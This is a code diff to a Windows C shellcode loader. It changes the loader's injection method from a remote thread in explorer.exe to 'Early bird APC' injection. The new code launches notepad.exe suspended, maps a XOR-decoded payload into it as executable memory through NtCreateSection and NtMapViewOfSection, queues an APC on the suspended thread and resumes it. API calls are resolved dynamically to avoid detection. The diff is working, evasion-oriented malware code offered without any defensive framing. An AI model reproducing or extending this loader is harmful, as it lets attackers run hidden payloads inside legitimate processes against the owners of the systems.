@@ -8,7 +8,7 @@
 #include "helpers.h"
 
 // LNK4210: Cannot have global variables using this, 'global' variables declared in each func
-// #pragma comment(linker, "/entry:WinMain")
+#pragma comment(linker, "/entry:WinMain")
 
 // Resolved function types
 typedef HMODULE (WINAPI * GetModuleHandle_t)(LPCWSTR lpModuleName);
@@ -92,6 +92,28 @@ typedef HANDLE (WINAPI * GetCurrentProcess_t)();
 
 // ------------------ End of MapView Delivery ------------------
 
+// ------------------ Early bird APC
+
+typedef BOOL (WINAPI * CreateProcessA_t)(
+    LPCSTR                lpApplicationName,
+    LPSTR                 lpCommandLine,
+    LPSECURITY_ATTRIBUTES lpProcessAttributes,
+    LPSECURITY_ATTRIBUTES lpThreadAttributes,
+    BOOL                  bInheritHandles,
+    DWORD                 dwCreationFlags,
+    LPVOID                lpEnvironment,
+    LPCSTR                lpCurrentDirectory,
+    LPSTARTUPINFOA        lpStartupInfo,
+    LPPROCESS_INFORMATION lpProcessInformation);
+
+typedef BOOL (WINAPI * QueueUserAPC_t)(
+    PAPCFUNC  pfnAPC,
+    HANDLE    hThread,
+    ULONG_PTR dwData);
+
+typedef DWORD (WINAPI * ResumeThread_t)(HANDLE hThread);
+
+// -------------- APC
 
 
 void XOR(char *data, size_t data_len, char *key, size_t key_len) {
@@ -193,9 +215,9 @@ int FindTarget(const char *procname) {
     return pid;
 }
 
-int Inject(HANDLE hProc, unsigned char *payload, unsigned int payload_len) {
+int Inject(HANDLE hProc, unsigned char *payload, unsigned int payload_len, HANDLE hThread) {
     
-    HANDLE hThread = NULL;
+    // HANDLE hThread = NULL;
     HANDLE hSection = NULL;
     PVOID pLocalView = NULL, pRemoteView = NULL;
     CLIENT_ID cid;
@@ -203,15 +225,15 @@ int Inject(HANDLE hProc, unsigned char *payload, unsigned int payload_len) {
     // 'Global' variables
     GetModuleHandle_t pGetModuleHandle = (GetModuleHandle_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetModuleHandleW");
     GetProcAddress_t pGetProcAddress = (GetProcAddress_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetProcAddress");
-    CloseHandle_t pCloseHandle = (CloseHandle_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "CloseHandle");
+    // CloseHandle_t pCloseHandle = (CloseHandle_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "CloseHandle");
 
     // Resolved functions
-    CreateRemoteThread_t pCreateRemoteThread = (CreateRemoteThread_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "CreateRemoteThread");
-    WaitForSingleObject_t pWaitForSingleObject = (WaitForSingleObject_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "WaitForSingleObject");
     NtCreateSection_t pNtCreateSection = (NtCreateSection_t) pGetProcAddress(pGetModuleHandle(L"NTDLL.DLL"), "NtCreateSection");
     NtMapViewOfSection_t pNtMapViewOfSection = (NtMapViewOfSection_t) pGetProcAddress(pGetModuleHandle(L"NTDLL.DLL"), "NtMapViewOfSection");
     RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "RtlMoveMemory");
     GetCurrentProcess_t pGetCurrentProcess = (GetCurrentProcess_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "GetCurrentProcess");
+    QueueUserAPC_t pQueueUserAPC = (QueueUserAPC_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "QueueUserAPC");
+    ResumeThread_t pResumeThread = (ResumeThread_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "ResumeThread");
 
     // Create memory section NtCreateSection
     pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER) &payload_len, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
@@ -225,13 +247,11 @@ int Inject(HANDLE hProc, unsigned char *payload, unsigned int payload_len) {
     // Create remote view: NEEDS TO BE XRW TO DECODE PAYLOAD (CHANGE THIS)
     pNtMapViewOfSection(hSection, hProc, &pRemoteView, NULL, NULL, NULL, (SIZE_T *) &payload_len, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE);
     
-    hThread = pCreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteView, NULL, 0, NULL);
+    
 
-    if (hThread != NULL) {
-            pWaitForSingleObject(hThread, -1);
-            pCloseHandle(hThread);
-            return 0;
-    }
+    pQueueUserAPC((PAPCFUNC)pRemoteView, hThread, NULL);
+    pResumeThread(hThread);
+
     return -1;
 }
 
@@ -275,23 +295,26 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	// Copy payload to new memory buffer
 	pRtlMoveMemory(exec_mem, payload, payload_len);
 
-	// Injecton process
-	int pid = 0;
+
+
+    int pid = 0;
     HANDLE hProc = NULL;
+    
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+    void * pRemoteCode;
+    
+    ZeroMemory( &si, sizeof(si) );
+    si.cb = sizeof(si);
+    ZeroMemory( &pi, sizeof(pi) );
 
-	pid = FindTarget("explorer.exe");
+    // ZeroMemory
 
-	if (pid) {
-		// try to open target process
-		hProc = pOpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
-						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
-						FALSE, (DWORD) pid);
+    CreateProcessA_t pCreateProcessA = (CreateProcessA_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "CreateProcessA");
 
-		if (hProc != NULL) {
-			Inject(hProc, (unsigned char *)exec_mem, payload_len);
-			pCloseHandle(hProc);
-		}
-	}
+    pCreateProcessA(0, "notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);
+
+    Inject(pi.hProcess, (unsigned char *)exec_mem, payload_len, pi.hThread);
 
 	return 0;
 }
